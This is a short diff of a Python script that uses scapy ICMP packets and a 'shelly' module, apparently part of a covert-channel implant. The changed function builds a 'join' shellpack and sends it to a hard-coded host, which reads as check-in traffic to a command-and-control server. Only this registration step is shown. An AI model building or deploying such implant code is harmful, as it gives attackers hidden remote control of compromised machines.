@@ -1,12 +1,9 @@
 #!/usr/bin/python3
 
 from scapy.all import sr,IP,ICMP,Raw,sniff
-import os
-import socket
-import psutil
-import pwd
 import base64
-from shelly import Host, Target
+from shelly import Host
+import shelly
 
 ICMP_ID = int(12800)
 TTL = int(64)
@@ -41,10 +38,8 @@ def setup_implant() -> Implant:
     print(implant)
     
     # Send join command
-    target = Target("192.168.157.6")
-    shellpack = implant.build_shellpack(command="join")
-    target.send(shellpack) 
-
+    shellpack = shelly.build_shellpack(implant, "join")
+    shelly.send("192.168.157.6", shellpack)
     return implant
 
 if __name__ == "__main__":
